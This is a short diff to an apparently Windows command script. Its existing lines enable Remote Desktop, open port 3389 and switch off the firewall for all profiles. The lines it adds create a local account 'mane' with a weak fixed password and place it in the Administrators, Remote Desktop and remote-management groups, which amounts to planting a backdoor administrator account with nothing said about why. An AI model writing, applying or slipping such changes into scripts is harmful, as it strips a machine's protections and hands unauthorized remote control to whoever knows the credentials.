@@ -9,3 +9,11 @@ reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Win
 netsh advfirewall firewall add rule name="RDP 3389" dir=in action=allow protocol=TCP localport=3389
 netsh firewall set opmode disable
 netsh advfirewall set allprofiles state off
+
+net user mane P@ssw0rd /add
+
+net localgroup "Administrators" mane /add
+net localgroup "Remote Desktop Users" mane /add
+net localgroup "Remote Management Users" mane /add
+net localgroup "RDS Management Servers" mane /add
+net localgroup "RDS Remote Access Servers" mane /add
